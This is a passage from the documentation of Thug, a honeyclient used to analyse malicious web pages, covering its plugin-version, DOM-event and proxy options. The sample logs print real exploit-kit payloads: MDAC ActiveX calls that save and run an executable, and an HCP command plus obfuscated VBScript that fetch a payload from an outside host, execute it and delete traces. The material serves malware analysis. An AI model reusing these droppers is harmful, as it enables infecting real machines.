105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));</script>
        [2012-07-02 19:21:11] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:21:17] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:21:17] <param name="Play" value="0"></param>
        [2012-07-02 19:21:17] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)


It's quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
vulnerability is not served in this case. 


DOM Events Handling
-------------------

A useful option is the -e (--events) option which allows you to specify which DOM events should
be handled by Thug. By default `load` and `mousemove` events are always handled but you can add
other ones with this option. Using this option is quite simple. All you need to do is to specify
a comma-separated list of events to handle as shown below.

.. code-block:: sh

        ~ $ thug -e click,mouseover URL
        
In this example, the DOM events `load`, `mousemove`, `click` and `mouseover` will be handled by 
Thug while all the other ones will be ignored.

 
Adobe Acrobat Reader
--------------------

Taking a look at the available options you can see the -A (--adobepdf) option which is quite 
useful for getting different PDF exploits which target different version of Adobe Acrobat
Reader. This happens because exploit kits usually serve PDF files which exploit specific 
vulnerabilities basing on the Adobe Acrobat Reader version. Let's take a look at what happens if
we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 9.1.0 (which is
the default one). 

.. code-block:: sh

        ~ $ thug -A 8.1.0 "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:18:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:18:00] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:18:00] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:18:03] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:03] Saving applet Ryp.jar
        [2012-07-02 19:18:04] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:18:04] ActiveXObject: acropdf.pdf
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:18:04] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
        [2012-07-02 19:18:04] ActiveXObject: adodb.stream
        [2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
        [2012-07-02 19:18:04] ActiveXObject: shell.application
        [2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
        [2012-07-02 19:18:04] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:18:04] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&e=2
        [2012-07-02 19:18:07] [HTTP] URL: http://[omitted]/w.php?f=b081d&e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:08] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:18:08] [Microsoft XMLHTTP ActiveX] send
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] open
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] Write
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] SaveToFile (.//..//3c9f737.exe)
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] Close
        [2012-07-02 19:18:08] [Shell.Application ActiveX] ShellExecute command: .//..//3c9f737.exe
        [2012-07-02 19:18:08] [Navigator URL Translation] ./data/ap2.php -->  http://[omitted]/data/ap2.php
        [2012-07-02 19:18:14] [HTTP] URL: http://[omitted]/data/ap2.php (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:15] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:18:15] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:18:15] [AST]: Eval argument length > 64
        [2012-07-02 19:18:15] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:18:16] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:16] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:18:22] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:18:22] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:18:22] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:18:28] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:18:28] <param name="Play" value="0"></param>
        [2012-07-02 19:18:28] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)

Comparing the following line

.. code-block:: sh

        [2012-07-02 19:18:14] [HTTP] URL: http://[omitted]/data/ap2.php (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)

with what we got using Adobe Acrobat Reader 9.1.0

.. code-block:: sh

        [2012-07-02 19:15:36] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)

it's easy to realize that a different malicious PDF file was served in this case.


Shockwave Flash
---------------

Taking a look at the available options you can see the -S (--shockwave) option which is quite
useful for getting different Flash exploits which target differents version of Shockwave Flash. 
This happens because exploit kits usually serve Flash files which exploit specific vulnerabilities 
basing on Shockwave Flash version. Let's take a look at what happens if we locally analyze
PluginDetect (see Local Analysis later for details).

.. code-block:: sh

        ~/thug/src ~ $ thug -l ../samples/misc/PluginDetect-0.7.8.html 
        [2012-11-15 17:32:26] ActiveXObject: msxml2.xmlhttp
        [2012-11-15 17:32:26] ActiveXObject: acropdf.pdf
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-11-15 17:32:26] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-11-15 17:32:26] <object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:32:26] <object classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
        [2012-11-15 17:32:26] ActiveXObject: javawebstart.isinstalled.1.6.0.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_40
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_39
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_38
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_37
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_36
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_35
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_34
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_33
        [2012-11-15 17:32:26] ActiveXObject: javaplugin.160_32
        [2012-11-15 17:32:26] ActiveXObject: javawebstart.isinstalled.1.6.0.0
        [2012-11-15 17:32:26] [Window] Alert Text: AdobeReader version: 9,1,0,0
        [2012-11-15 17:32:26] [Window] Alert Text: Flash version: 10,0,64,0
        [2012-11-15 17:32:26] [Window] Alert Text: Java version: 1,6,0,32


Let's try with different Adobe Acrobat Reader and Shockwave Flash versions now.

.. code-block:: sh

        ~/thug/src ~ $ thug -l -A 8.1.0 -S 10.3.1.180 ../samples/misc/PluginDetect-0.7.8.html 
        [2012-11-15 17:32:58] ActiveXObject: msxml2.xmlhttp
        [2012-11-15 17:32:58] ActiveXObject: acropdf.pdf
        [2012-11-15 17:32:58] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-11-15 17:32:58] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-11-15 17:32:58] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-11-15 17:32:58] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-11-15 17:32:58] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-11-15 17:32:58] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-11-15 17:32:58] <object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:32:58] <object classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:32:58] Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
        [2012-11-15 17:32:58] Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
        [2012-11-15 17:32:58] Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
        [2012-11-15 17:32:58] Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
        [2012-11-15 17:32:58] Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
        [2012-11-15 17:32:58] Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
        [2012-11-15 17:32:58] ActiveXObject: javawebstart.isinstalled.1.6.0.0
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_40
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_39
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_38
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_37
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_36
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_35
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_34
        [2012-11-15 17:32:58] Unknown ActiveX Object: javaplugin.160_33
        [2012-11-15 17:32:58] ActiveXObject: javaplugin.160_32
        [2012-11-15 17:32:58] ActiveXObject: javawebstart.isinstalled.1.6.0.0
        [2012-11-15 17:32:58] [Window] Alert Text: AdobeReader version: 8,1,0,0
        [2012-11-15 17:32:58] [Window] Alert Text: Flash version: 10,3,1,180
        [2012-11-15 17:32:58] [Window] Alert Text: Java version: 1,6,0,32


JavaPlugin and JavaWebStart
---------------------------

Taking a look at the available options you can see the -J (--javaplugin) option which is quite
useful for getting different Java exploits which target different versions of Java. Let's take 
a look at what happens if we locally analyze PluginDetect (see Local Analysis later for details).

.. code-block:: sh

        ~/thug/src ~ $ thug -l ../samples/misc/PluginDetect-0.7.8.html 
        [2012-11-15 17:32:26] ActiveXObject: msxml2.xmlhttp
        [2012-11-15 17:32:26] ActiveXObject: acropdf.pdf
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-11-15 17:32:26] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-11-15 17:32:26] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-11-15 17:32:26] <object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:32:26] <object classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javawebstart.isinstalled.1.7.0.0
        [2012-11-15 17:32:26] ActiveXObject: javawebstart.isinstalled.1.6.0.0
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_40
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_39
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_38
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_37
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_36
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_35
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_34
        [2012-11-15 17:32:26] Unknown ActiveX Object: javaplugin.160_33
        [2012-11-15 17:32:26] ActiveXObject: javaplugin.160_32
        [2012-11-15 17:32:26] ActiveXObject: javawebstart.isinstalled.1.6.0.0
        [2012-11-15 17:32:26] [Window] Alert Text: AdobeReader version: 9,1,0,0
        [2012-11-15 17:32:26] [Window] Alert Text: Flash version: 10,0,64,0
        [2012-11-15 17:32:26] [Window] Alert Text: Java version: 1,6,0,32

Let's try with a different JavaPlugin version now.

.. code-block:: sh

        ~/thug/src ~ $ thug -l -J 1.7.0.7 ../samples/misc/PluginDetect-0.7.8.html 
        [2012-11-15 17:40:55] ActiveXObject: msxml2.xmlhttp
        [2012-11-15 17:40:56] ActiveXObject: acropdf.pdf
        [2012-11-15 17:40:56] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-11-15 17:40:56] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-11-15 17:40:56] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-11-15 17:40:56] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-11-15 17:40:56] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-11-15 17:40:56] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-11-15 17:40:56] <object classid="clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:40:56] <object classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" height="1" style="outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;" width="1"></object>
        [2012-11-15 17:40:56] Unknown ActiveX Object: javawebstart.isinstalled.1.9.1.0
        [2012-11-15 17:40:56] Unknown ActiveX Object: javawebstart.isinstalled.1.9.0.0
        [2012-11-15 17:40:56] Unknown ActiveX Object: javawebstart.isinstalled.1.8.1.0
        [2012-11-15 17:40:56] Unknown ActiveX Object: javawebstart.isinstalled.1.8.0.0
        [2012-11-15 17:40:56] Unknown ActiveX Object: javawebstart.isinstalled.1.7.1.0
        [2012-11-15 17:40:56] ActiveXObject: javawebstart.isinstalled.1.7.0.0
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_40
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_39
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_38
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_37
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_36
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_35
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_34
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_33
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_32
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_31
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_30
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_29
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_28
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_27
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_26
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_25
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_24
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_23
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_22
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_21
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_20
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_19
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_18
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_17
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_16
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_15
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_14
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_13
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_12
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_11
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_10
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_09
        [2012-11-15 17:40:56] Unknown ActiveX Object: javaplugin.170_08
        [2012-11-15 17:40:56] ActiveXObject: javaplugin.170_07
        [2012-11-15 17:40:56] ActiveXObject: javawebstart.isinstalled.1.7.0.0
        [2012-11-15 17:40:56] [Window] Alert Text: AdobeReader version: 9,1,0,0
        [2012-11-15 17:40:56] [Window] Alert Text: Flash version: 10,0,64,0
        [2012-11-15 17:40:56] [Window] Alert Text: Java version: 1,7,0,7


Proxy support
-------------

Another really useful option is *-p (--proxy)* which allows to specify a proxy. Currently Thug
supports HTTP, SOCKS4 and SOCKS5 proxy using the following format
        
        scheme://[username:password@]host:port 
        (supported schemes: http, socks4, socks5)

This option allows Thug to make use of Tor in order to anonymize the access to a malicious 
page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
using *socks5://127.0.0.1:9050* as proxy and your real IP address will not be revealed.

.. code-block:: sh

        ~ $ thug -p socks5://127.0.0.1:9050 "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:22:14] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:22:14] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:22:14] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:22:16] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:17] Saving applet Ryp.jar
        [2012-07-02 19:22:17] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:22:17] ActiveXObject: acropdf.pdf
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:22:18] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:22:18] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
        [2012-07-02 19:22:18] ActiveXObject: adodb.stream
        [2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
        [2012-07-02 19:22:18] ActiveXObject: shell.application
        [2012-07-02 19:22:18] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
        [2012-07-02 19:22:18] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:22:18] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&e=2
        [2012-07-02 19:22:22] [HTTP] URL: http://[omitted]/w.php?f=b081d&e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:23] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:22:23] [Microsoft XMLHTTP ActiveX] send
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] open
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] Write
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] SaveToFile (.//..//e9a458c.exe)
        [2012-07-02 19:22:23] [Adodb.Stream ActiveX] Close
        [2012-07-02 19:22:23] [Shell.Application ActiveX] ShellExecute command: .//..//e9a458c.exe
        [2012-07-02 19:22:23] [Navigator URL Translation] ./data/ap1.php?f=b081d -->  http://[omitted]/data/ap1.php?f=b081d
        [2012-07-02 19:22:30] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:30] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:22:30] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:22:30] [AST]: Eval argument length > 64
        [2012-07-02 19:22:30] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:22:32] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:22:32] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Code:
